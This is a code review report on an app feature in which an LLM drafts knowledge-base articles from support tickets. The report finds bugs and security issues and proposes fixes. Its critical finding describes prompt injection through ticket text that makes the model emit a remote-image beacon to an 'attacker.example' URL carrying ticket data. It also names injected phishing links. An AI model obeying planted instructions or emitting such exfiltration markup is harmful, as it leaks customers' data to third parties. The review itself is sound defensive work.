**Reviewed:** 2026-11-09T06:46:24Z

## Summary

Authorization is solid: every loader (`checkAdmin`, `proposal-queries.ts:130-137`) and every service behind the six actions runs `findActiveMembership` (or the FOR SHARE lock for publish) and `isAdminRole` before any proposal read, refusals carry no data, and the `/kb`, ticket detail and ticket list pages only use the role to hide entries. No `bigint` reaches a client component (Ticket.number is `Int`; `snapshotSeq` is never selected). Actions never return `err.message`. All titles and copy render as React text; the only `dangerouslySetInnerHTML` is server-rendered `renderMarkdown` output. No named text sizes or hardcoded colours were found in the scoped files. Publish cannot run with unsaved edits (trigger disabled while `isDirty`, server publishes the stored row at `expectedVersion`) or without the checkbox in the UI (`handlePublish` guard and disabled button); `aria-disabled` controls (restart, retry, bulk entry, menu item) all early-return.

The blocking issue is a privacy and prompt-injection hole in the preview. `renderMarkdown` keeps remote `<img src="https://…">`, and the proposal body is LLM output written from untrusted ticket text. A crafted ticket can make the model add a zero-click beacon that sends data out of the server when an admin opens the review page. Seven warnings cover: a swallowed login redirect in every action, edits lost in the remount after a save, unknown-outcome states with no reload path, the known "Untitled (drafting…)" on FAILED rows (confirmed as a defect), focus lost around the Start dialog on the review page, a silent restart success, and external links in AI drafts that the reviewer cannot see.

## Critical Issues

### CR-01: AI-written proposal preview renders remote images, a zero-click exfiltration and tracking channel driven by prompt injection

**File:** `src/app/(app)/kb/proposals/[id]/page.tsx:82`; `src/app/(app)/kb/proposals/[id]/proposal-review.tsx:246-254`, `429-433`, `548-561`; root cause `src/lib/markdown/render.ts:45-55`, `src/lib/kb/proposal-schema.ts:106-113`
**Issue:** The preview HTML is `renderMarkdown(proposal.bodyMarkdown)`. Unlike `sanitizeEmailHtml` (`render.ts:62-79`, `rehypeStripRemoteImages`), `renderMarkdown` keeps `img` elements with `http(s)` `src` (hast-util-sanitize `defaultSchema`), and the K51 checks reject only `/tickets/` paths. The 12.2-02 plan even asserts that `![logo](https://example.com/img/logo.png)` passes. `bodyMarkdown` is model output generated from up to five customer tickets, which CLAUDE.md treats as untrusted input. A requester can plant an instruction in a ticket that leads the model to emit `![status](https://attacker.example/p.gif?d=<details from the other selected tickets>)`. The system prompt asks the model not to do this but does not enforce it. The browser then fetches that URL:
- automatically, with no click, on every view of a REJECTED or PUBLISHED proposal (`ReadOnlyArticle`, lines 548-561, renders `previewHtml` unconditionally). A proposal rejected *because* it looked suspicious still fires the request.
- on one click of "Preview" for a DRAFT (lines 429-433).
This sends ticket-derived data and the admin's IP/User-Agent to a third party. It breaks the CLAUDE.md rules "Never send data to any third party other than the user-configured LLM" and "guard against prompt-injection that tries to … exfiltrate data". On publish, the same `renderMarkdown` output becomes the article's stored `bodyHtml`, so the beacon also persists into the knowledge base. The app has no CSP `img-src` to contain it (`next.config.ts`, `Caddyfile`: no Content-Security-Policy).
**Fix:** Make it fail-closed in the pipeline and also defensive at render:
```ts
// proposal-schema.ts: new refusal, used by validateProposalOutput (-> INVALID_OUTPUT) and
// validateDraftFields (field "bodyMarkdown", new code EXTERNAL_IMAGE + copy row via UI-SPEC amendment)
export function renderedBodyHasRemoteImage(bodyMarkdown: string): boolean {
  // walk renderMarkdown(bodyMarkdown) like renderedBodyLinksToTicket; true for any img/src or
  // source/srcSet whose URL resolves to a different origin (http:, https:, protocol-relative)
}
// render.ts: export a proposal renderer that strips remote images before sanitize
const proposalProcessor = unified().use(remarkParse).use(remarkGfm).use(remarkRehype)
  .use(rehypeStripRemoteImages).use(rehypeSafeLinks).use(rehypeSanitize, schema).use(rehypeStringify);
export function renderProposalMarkdown(md: string) { return String(proposalProcessor.processSync(md)); }
```
Use the stripping renderer in `[id]/page.tsx:82` and for the `bodyHtml` written by `publishProposal`. As defence in depth, add `Content-Security-Policy: img-src 'self' data: blob:` for the app.

## Warnings

### WR-01: Every proposal action swallows the login redirect and reports "outcome unknown" instead

**File:** `src/app/(app)/kb/proposals/actions.ts:74-78, 87-91, 98-103, 115-119, 132-136, 149-153, 166-170`; `src/lib/session.ts:20-24, 53-57`
**Issue:** `getSessionActor()` calls `requireSession()`, which on an expired or missing session calls `redirect("/login")`. That works by throwing Next's `NEXT_REDIRECT` error. Each action calls `getSessionActor()` inside a `try { … } catch { return unknownResult(...) }`, so the redirect is caught and turned into `{ ok: false, code: "UNKNOWN" }`. The user then sees "The result is not known. The article may have been published. Reload the proposal…" (or "Save outcome unknown"), and the submit is locked, when they should be sent to sign in. The Start dialog's `loadStartSelectionAction` shows "The proposal could not be started" for the same cause. Every other action in the repo (`settings/statuses/actions.ts:30`, `tickets/[id]/actions.ts:44`, …) calls `getSessionActor()` outside any try.
**Fix:** Resolve the actor before the try, or rethrow framework control-flow errors:
```ts
import { unstable_rethrow } from "next/navigation";
export async function saveProposalAction(input: SaveProposalInput) {
  const actor = await getSessionActor();           // redirect propagates
  let result: SaveProposalResult;
  try { result = await saveProposalDraft(actor, input); }
  catch (err) { unstable_rethrow(err); return unknownResult("save"); }
  ...
}
```
If `getSessionActor` must stay in the try (it also throws on a missing active organization), call `unstable_rethrow(err)` as the first statement of each catch.

### WR-02: Edits typed right after a successful save are silently discarded by the version-keyed remount

**File:** `src/app/(app)/kb/proposals/[id]/proposal-review.tsx:131-140, 350-357`
**Issue:** `DraftEditor` is keyed `${proposal.version}:${reloadCount}`. On save success the editor resets the form to the saved values, so the fields are editable and clean again. It then calls `router.refresh()`. When the refresh lands, `proposal.version` has changed, the key changes, and React unmounts the editor and mounts a new one from server props. Anything the admin typed between the save and the refresh (a server round trip of several hundred ms or more) is thrown away with no warning. Until the refresh lands, "Preview" is also enabled (the body is clean) but shows the old `previewHtml` from before the save. If the refresh fails, that stale preview stays while "Approve and publish…" publishes the newly stored body.
**Fix:** Do not remount for the editor's own save. Keep the key on `reloadCount` only, plus an "external version" that changes only when the server version differs from the editor's local `version`:
```tsx
const editorKey = `${reloadCount}`;          // own saves keep the instance
// inside DraftEditor: when proposal.version > version (someone else's save arrived via reload),
// the parent bumps reloadCount instead.
```
Alternatively, disable the Preview toggle and keep the fields read-only (`readOnly`) from save success until the refreshed props arrive (`proposal.version === version`).

### WR-03: Unknown outcomes and NOT_DRAFT leave the page in a stale state with no reload path, despite copy that says "Reload the proposal"

**File:** `src/lib/kb/proposal-outcome.ts:107-109, 161-164, 166-175`; `src/app/(app)/kb/proposals/[id]/publish-dialog.tsx:147-148, 195, 236-253`; `reject-dialog.tsx:134-135, 172, 186-203`; `proposal-review.tsx:446-469`
**Issue:** `unknownView` and the NOT_DRAFT refusal set `offerReload: false`, so "Reload proposal" appears only for CONFLICT. The copy for these states nonetheless tells the user to reload ("…may have been published. Reload the proposal to check…", "This proposal is no longer a draft. Reload it to see its status."). Consequences:
- Save, unknown outcome: Save stays locked, the form stays dirty (so publish is disabled), and the only exit is a browser reload.
- Publish/Reject, unknown outcome when the write actually committed: closing the dialog leaves a DRAFT editor on screen with "Approve and publish…" enabled. `PublishFlow` is mounted per opening, so reopening clears the `disableSubmit` lock. The admin keeps editing a proposal that is already PUBLISHED or REJECTED and learns this only from a later NOT_DRAFT refusal, which again offers no reload. The committed result stays hidden until a manual browser refresh.
**Fix:** Offer the reload for every state whose copy asks for it. In the dialogs, refresh in the background after an unknown result:
```ts
function unknownView(action) { return view("unknown","error",outcomeUnknownCopy(action),UNKNOWN_FOCUS[action],true, action !== "start"); }
// saveRefusalView / dialogRefusalView: offerReload for CONFLICT and NOT_DRAFT
```
In `PublishFlow`/`RejectFlow`, call `router.refresh()` when `next.kind === "unknown"`, so a committed publish or reject shows up once the dialog closes.

### WR-04 (known item, confirmed defect): A FAILED proposal with no title is listed as "Untitled (drafting…)"

**File:** `src/app/(app)/kb/proposals/page.tsx:93-95`; `src/lib/kb/proposal-copy.ts:171-172`
**Issue:** `row.title ?? UNTITLED_WHILE_GENERATING` applies to every null title. A proposal that failed before drafting (AI_OFF, SOURCE_CHANGED, PROVIDER, INVALID_OUTPUT, CONFIGURATION) has a null title forever, so the list shows "Untitled (drafting…)" next to a "Failed" chip and its short reason. The row says drafting is in progress when the proposal is terminal and was never drafted. The UI-SPEC row is named "Untitled while generating" and Surface 2's partial state says "Generating rows show 'Untitled (drafting…)'", so the implementation goes beyond the spec's intent. The plan 08 SUMMARY records the gap but does not fix it.
**Fix:** Use the drafting label only for GENERATING. For a null title in any other status, render no title text and let the failure short reason take the title column. If a word is required, add an "Untitled" row through a UI-SPEC amendment:
```tsx
{row.title ?? (row.status === "GENERATING" ? UNTITLED_WHILE_GENERATING : null)}
```

### WR-05: Focus lost around the Start dialog when it is opened from the review page; "Start success → h1" is not implemented

**File:** `src/app/(app)/kb/proposals/[id]/proposal-review.tsx:563-596` (line 593); `src/components/kb/start-proposal-dialog.tsx:90, 201-205`
**Issue:** `NewProposalAction` opens `StartProposalDialog` from a plain button, not a `DialogTrigger`, and passes no `onCloseAutoFocus`. Radix's modal DialogContent then prevents FocusScope's return and focuses `context.triggerRef`, which is unset. The repo's own comment in `ticket-actions-menu.tsx` (UI-WR-03) says this leaves focus on `<body>`. The doc comment at line 566 ("The dialog returns focus to this button when it closes") is therefore wrong, and UI-SPEC 3i "Start dialog closed without starting → the trigger" fails on FAILED and REJECTED pages. Separately, UI-SPEC 3i "Start success → the review page `<h1>` after navigation" is implemented nowhere. `StartFlow` calls `onClose()` and `router.push(...)`, and the review page has no arrival focus (only `headingFocusPending` for its own actions). Focus is left on whatever the old page had, which may be a removed control.
**Fix:** Pass a ref-based `onCloseAutoFocus` from `NewProposalAction`:
```tsx
const buttonRef = useRef<HTMLButtonElement>(null);
<StartProposalDialog … onCloseAutoFocus={(e) => { e.preventDefault(); buttonRef.current?.focus(); }} />
```
For start success, navigate with a marker (for example `router.push(\`/kb/proposals/${id}?started=1\`)` or a sessionStorage flag) that `ProposalReview` reads once on mount to focus `headingId`. Also skip the close-focus return in that case.

### WR-06: A queued "Restart generation" gives no feedback and leaves the button active, so a second press shows a misleading error

**File:** `src/app/(app)/kb/proposals/[id]/proposal-review.tsx:716-748, 763-791`; `src/lib/kb/proposal-outcome.ts:137-141`
**Issue:** On `{ ok: true, queued: true }` the resolver returns `message: null`. The view sets no status line, does not call `router.refresh()`, and leaves the button enabled under a notice that still says "This draft is taking longer than expected". UI-SPEC 3i requires "success in a `role="status"` line under it". Until the next 5 s poll, a second press runs the restart on a row that is no longer stuck. The server then returns NOT_STUCK or CONFLICT, which renders "Nothing was changed. Wait a moment and try again." as a `role="alert"` right after a restart that succeeded.
**Fix:** After any restart success, call `router.refresh()` at once (the poll interval is not needed) and keep the button `aria-disabled` until the refreshed `proposal.stuck` is false. Ask for a UI-SPEC copy row for the queued case (for example "Generation restarted.") so the role=status line the spec requires has text.

### WR-07: Outbound links in an AI-written draft are not surfaced to the reviewer (prompt-injected phishing links can be published)

**File:** `src/app/(app)/kb/proposals/[id]/proposal-review.tsx:245-254, 429-433`; `src/app/(app)/kb/proposals/[id]/publish-dialog.tsx:210-214`; `src/lib/kb/proposal-copy.ts:334-338`
**Issue:** The same injection path as CR-01, needing one click instead of none. The model can write `[Reset your password](https://attacker.example/…)` and the preview shows only the link text. The publish checklist (facts, personal details, private content) never mentions links, and the K51 checks reject only `/tickets/` paths. Once published, the article feeds RAG drafts that go to customers. A human approves those drafts too, but the URL is easy to miss in the same way.
**Fix:** Have the server page list every outbound link host found in the body (walk the rendered hast, as `renderedBodyLinksToTicket` does) in a warning notice above the editor ("This draft links to: example.com, …"). Add a checklist line ("Every link goes where it says"), which needs a UI-SPEC copy amendment. Or refuse absolute external links in generated output, as an INVALID_OUTPUT reason.
